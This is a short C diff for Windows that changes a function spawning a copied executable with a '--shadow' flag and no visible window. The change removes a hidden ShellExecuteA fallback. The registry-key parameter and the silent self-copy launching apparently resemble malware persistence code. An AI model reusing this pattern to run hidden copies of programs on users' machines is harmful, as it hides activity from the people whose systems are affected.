@@ -333,16 +333,12 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     char cmdLine[1024];
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
 
-    BOOL created = CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
-                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                       NULL, NULL, &si, &pi);
-
-    if (created) {
+    CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
+                   CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+                   NULL, NULL, &si, &pi);
+    if (pi.hProcess) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-    } else {
-        /* Fallback: ShellExecuteA with "open" */
-        ShellExecuteA(NULL, "open", destPath, "--shadow", NULL, SW_HIDE);
     }
 }
 
